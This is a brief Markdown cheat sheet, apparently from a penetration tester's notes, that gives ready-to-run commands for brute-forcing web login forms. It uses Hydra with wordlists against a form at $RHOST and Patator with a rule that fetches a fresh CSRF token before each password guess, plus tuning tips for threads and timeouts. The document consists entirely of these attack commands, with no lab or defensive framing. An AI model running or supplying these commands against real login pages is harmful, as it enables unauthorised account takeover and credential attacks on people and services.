# Brute Force

## Authentication forms using Hydra

```bash
hydra \
-L /usr/share/dirb/wordlists/small.txt \
-P /usr/share/dirb/wordlists/small.txt \
$RHOST \
https-post-form \
"/cdn-cgi/login/index.php:username=^USER^&password=^PASS^:failed" \
-o hydra-result.txt \
-f \
-V
```

## Authentication forms with CSRF using Patator

```bash
patator \
--threads=1 \
--timeout=5 \
http_fuzz \
method=POST \
url="http://$RHOST/login.php" \
body='username=admin&password=FILE0&user_token=_CSRF_' \
0=/usr/share/wordlists/seclists/Passwords/probable-v2-top12000.txt \
before_urls="http://$RHOST/login.php" \
before_egrep="_CSRF_:<input type='hidden' name='user_token' value='(\w+)' />" \
-x ignore:fgrep='incorrect'
```

* `--threads=1` we ensure that the CSRF is not corrupted, but we got a very slow process
* `--timeout=5` avoid that request fails for random sleeps on server during login.